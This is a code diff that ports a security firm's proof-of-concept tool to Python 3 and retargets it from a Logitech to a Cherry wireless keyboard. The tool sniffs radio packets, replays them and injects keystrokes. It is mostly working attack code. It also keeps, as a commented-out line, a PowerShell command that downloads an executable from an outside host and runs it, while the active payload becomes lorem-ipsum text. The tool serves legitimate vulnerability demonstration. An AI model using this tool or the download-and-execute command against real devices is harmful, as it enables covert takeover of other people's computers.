@@ -1,4 +1,4 @@
-#!/usr/bin/env python2
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
 """
@@ -8,8 +8,8 @@
   Gerhard Klostermeier <gerhard.klostermeier@syss.de>
 
   Proof-of-Concept software tool to demonstrate the replay
-  and keystroke injection vulnerabilities of the wireless desktop set
-  Logitech MK520
+  and keystroke injection vulnerabilities of the wireless keyboard
+  Cherry B.Unlimited AES
 
   Copyright (C) 2016 SySS GmbH
 
@@ -27,14 +27,13 @@
   along with this program.  If not, see <http://www.gnu.org/licenses/>.
 """
 
-__version__ = '0.8'
-__author__ = 'Matthias Deeg, Gerhard Klostermeier'
+__version__ = '0.9'
+__author__ = 'Matthias Deeg, Gerhard Klostermeier - python3-port by Einstein2150'
 
-import argparse
 import logging
 import pygame
 
-from binascii import hexlify, unhexlify
+from binascii import hexlify
 from lib import keyboard
 from lib import nrf24
 from logging import debug, info
@@ -43,7 +42,8 @@ from time import sleep, time
 from sys import exit
 
 # constants
-ATTACK_VECTOR   = u"powershell (new-object System.Net.WebClient).DownloadFile('http://ptmd.sy.gs/syss.exe', '%TEMP%\\syss.exe'); Start-Process '%TEMP%\\syss.exe'"
+#ATTACK_VECTOR   = u"powershell (new-object System.Net.WebClient).DownloadFile('http://ptmd.sy.gs/syss.exe', '%TEMP%\\syss.exe'); Start-Process '%TEMP%\\syss.exe'"
+ATTACK_VECTOR   = "Just an input from the hacker :D Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet. Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet."
 
 RECORD_BUTTON   = pygame.K_1                # record button
 REPLAY_BUTTON   = pygame.K_2                # replay button
@@ -58,35 +58,31 @@ ATTACK          = 4                         # attack state
 
 SCAN_TIME       = 2                         # scan time in seconds for scan mode heuristics
 DWELL_TIME      = 0.1                       # dwell time for scan mode in seconds
+PREFIX_ADDRESS  = ""                        # prefix address for promicious mode
 KEYSTROKE_DELAY = 0.01                      # keystroke delay in seconds
 
-# Logitech Unifying Keep Alive packet with 90 ms
-KEEP_ALIVE_90 = unhexlify("0040005A66")
-KEEP_ALIVE_TIMEOUT = 0.07
 
+class CherryAttack():
+    """Cherry Attack"""
 
-class LogitechAttack():
-    """Logitech Attack"""
-
-    def __init__(self, address=""):
-        """Initialize Logitech Attack"""
+    def __init__(self):
+        """Initialize Cherry Attack"""
 
         self.state = IDLE                           # current state
-        self.channel = 2                            # used ShockBurst channel
+        self.channel = 6                            # used ShockBurst channel (was 6 for all tested Cherry keyboards)
         self.payloads = []                          # list of sniffed payloads
         self.kbd = None                             # keyboard for keystroke injection attacks
         self.screen = None                          # screen
         self.font = None                            # font
         self.statusText = ""                        # current status text
-        self.address = address
 
         try:
             # initialize pygame variables
             pygame.init()
             self.icon = pygame.image.load("./images/syss_logo.png")
-            self.bg = pygame.image.load("./images/logitech_attack_bg.png")
+            self.bg = pygame.image.load("./images/cherry_attack_bg.png")
 
-            pygame.display.set_caption("SySS Logitech Attack PoC")
+            pygame.display.set_caption("SySS Cherry Attack PoC")
             pygame.display.set_icon(self.icon)
             self.screen = pygame.display.set_mode((400, 300), 0, 24)
             self.font = pygame.font.SysFont("arial", 24)
@@ -107,7 +103,7 @@ class LogitechAttack():
             self.setState(SCAN)
         except:
             # info output
-            info("[-] Error: Could not initialize Logitech Attack")
+            info("[-] Error: Could not initialize Cherry Attack")
 
 
     def showText(self, text, x = 40, y = 140):
@@ -148,16 +144,14 @@ class LogitechAttack():
 
     def run(self):
         # main loop
-        last_keep_alive = time()
-        running = True
-        while running:
+        while True:
             for i in pygame.event.get():
                 if i.type == QUIT:
-                    running = False
+                    exit()
 
                 elif i.type == KEYDOWN:
                     if i.key == K_ESCAPE:
-                        running = False
+                        exit()
 
                     # record button state transitions
                     if i.key == RECORD_BUTTON:
@@ -221,34 +215,28 @@ class LogitechAttack():
             elif self.state == REPLAY:
                 # remove duplicate payloads (retransmissions)
                 payloadList = self.unique_everseen(self.payloads)
-#                payloadList = self.payloads
 
                 # replay all payloads
                 for p in payloadList:
-                    if len(p) == 22:
-                        # transmit payload
-                        self.radio.transmit_payload(p.tostring())
+                    # transmit payload
+                    self.radio.transmit_payload(p.tobytes())
 
-                        # info output
-                        info('Sent payload: {0}'.format(hexlify(p)))
+                    # info output
+                    info('Sent payload: {0}'.format(hexlify(p)))
 
-                        # send keep alive with 90 ms time out
-                        self.radio.transmit_payload(KEEP_ALIVE_90)
-                        last_keep_alive = time()
-
-                        sleep(KEYSTROKE_DELAY)
+                    sleep(KEYSTROKE_DELAY)
 
                 # set IDLE state after playback
                 self.setState(IDLE)
 
             elif self.state == SCAN:
-                # put the radio in promiscuous mode with given address
-                if len(self.address) > 0:
-                    self.radio.enter_promiscuous_mode(self.address[::-1])
-                else:
-                    self.radio.enter_promiscuous_mode()
+                # put the radio in promiscuous mode
+                self.radio.enter_promiscuous_mode(PREFIX_ADDRESS)
 
-                # set the initial channel
+                # define channels for scan mode
+                SCAN_CHANNELS = [6]
+
+                # set initial channel
                 self.radio.set_channel(SCAN_CHANNELS[0])
 
                 # sweep through the defined channels and decode ESB packets in pseudo-promiscuous mode
@@ -268,16 +256,20 @@ class LogitechAttack():
                         address, payload = value[0:5], value[5:]
 
                         # convert address to string and reverse byte order
-                        converted_address = address[::-1].tostring()
-                        self.address = converted_address
-                        break
+                        converted_address = address[::-1].tobytes()
+
+                        # check if the address most probably belongs to a Cherry keyboard
+                        if converted_address[0] in range(0x31, 0x3f):
+                            # first fit strategy to find a Cherry keyboard
+                            self.address = converted_address
+                            break
 
                 self.showText("Found keyboard")
                 address_string = ':'.join('{:02X}'.format(b) for b in address)
                 self.showText(address_string)
 
                 # info output
-                info("Found nRF24 device with address {0} on channel {1}".format(address_string, SCAN_CHANNELS[channel_index]))
+                info("Found keyboard with address {0} on channel {1}".format(address_string, SCAN_CHANNELS[channel_index]))
 
                 # put the radio in sniffer mode (ESB w/o auto ACKs)
                 self.radio.enter_sniffer_mode(self.address)
@@ -297,33 +289,31 @@ class LogitechAttack():
                     value = self.radio.receive_payload()
 
                     if value[0] == 0:
-                        if len(payload) == 22:
-                            # do some time measurement
-                            last_key = time()
+                        # do some time measurement
+                        last_key = time()
 
                         # split the payload from the status byte
                         payload = value[1:]
 
                         # increment packet count
-                        if len(payload) == 22:
-                            # only count Logitech Unifying packets with encrypted data (should be 22 bytes long)
-                            packet_count += 1
-                            crypto_payload = payload
+                        packet_count += 1
 
                         # show packet payload
                         info('Received payload: {0}'.format(hexlify(payload)))
 
                     # heuristic for having a valid release key data packet
-                    if packet_count >= 2 and time() - last_key > SCAN_TIME:
+                    if packet_count >= 4 and time() - last_key > SCAN_TIME:
                         break
 
-                self.showText(u"Got crypto key!")
+                self.radio.receive_payload()
+
+                self.showText("Got crypto key!")
 
                 # info output
                 info('Got crypto key!')
 
                 # initialize keyboard
-                self.kbd = keyboard.LogitechKeyboard(crypto_payload.tostring())
+                self.kbd = keyboard.CherryKeyboard(payload.tobytes())
                 info('Initialize keyboard')
 
                 # set IDLE state after scanning
@@ -332,6 +322,7 @@ class LogitechAttack():
             elif self.state == ATTACK:
                 if self.kbd != None:
                     # send keystrokes for a classic download and execute PoC attack
+                    '''
                     keystrokes = []
                     keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE))
                     keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_GUI_RIGHT, keyboard.KEY_R))
@@ -342,21 +333,14 @@ class LogitechAttack():
                         self.radio.transmit_payload(k)
 
                         # info output
-                        info('Sent payload: {0}'.format(hexlify(k)))
-
-                         # send keep alive with 90 ms time out
-                        self.radio.transmit_payload(KEEP_ALIVE_90)
-                        last_keep_alive = time()
+ #                       info('Sent payload: {0}'.format(hexlify(k)))
 
                         sleep(KEYSTROKE_DELAY)
 
                     # need small delay after WIN + R
-                    for i in range(5):
-                         # send keep alive with 90 ms time out
-                        self.radio.transmit_payload(KEEP_ALIVE_90)
-                        last_keep_alive = time()
-                        sleep(0.06)
-
+                    sleep(0.2)
+'''
+                    keystrokes = []
                     keystrokes = self.kbd.getKeystrokes(ATTACK_VECTOR)
                     keystrokes += self.kbd.getKeystroke(keyboard.KEY_RETURN)
 
@@ -365,21 +349,12 @@ class LogitechAttack():
                         self.radio.transmit_payload(k)
 
                         # info output
-                        info('Sent payload: {0}'.format(hexlify(k)))
-
-                        # send keep alive with 90 ms time out
-                        self.radio.transmit_payload(KEEP_ALIVE_90)
-                        last_keep_alive = time()
+ #                      info('Sent payload: {0}'.format(hexlify(k)))
 
                         sleep(KEYSTROKE_DELAY)
 
                 # set IDLE state after attack
                 self.setState(IDLE)
-
-            if time() - last_keep_alive > KEEP_ALIVE_TIMEOUT:
-                # send keep alive with 90 ms time out
-                self.radio.transmit_payload(KEEP_ALIVE_90)
-                last_keep_alive = time()
 
 
 # main program
@@ -388,33 +363,11 @@ if __name__ == '__main__':
     level = logging.INFO
     logging.basicConfig(level=level, format='[%(asctime)s.%(msecs)03d]  %(message)s', datefmt="%Y-%m-%d %H:%M:%S")
 
-    # init argument parser
-    parser = argparse.ArgumentParser()
-    parser.add_argument('-a', '--address', type=str, help='Address of nRF24 device')
-    parser.add_argument('-c', '--channels', type=int, nargs='+', help='ShockBurst RF channel', default=range(2, 84), metavar='N')
-
-    # parse arguments
-    args = parser.parse_args()
-
-    # set scan channels
-    SCAN_CHANNELS = args.channels
-
-    if args.address:
-        try:
-            # address of nRF24 keyboard (CAUTION: Reversed byte order compared to sniffer tools!)
-            address = args.address.replace(':', '').decode('hex')[::-1][:5]
-            address_string = ':'.join('{:02X}'.format(ord(b)) for b in address[::-1])
-        except:
-            info("Error: Invalid address")
-            exit(1)
-    else:
-        address = ""
-
     # init
-    poc = LogitechAttack(address)
+    poc = CherryAttack()
 
     # run
-    info("Start Logitech Attack v{0}".format(__version__))
+    info("Start Cherry Attack v{0}".format(__version__))
     poc.run()
 
     # done
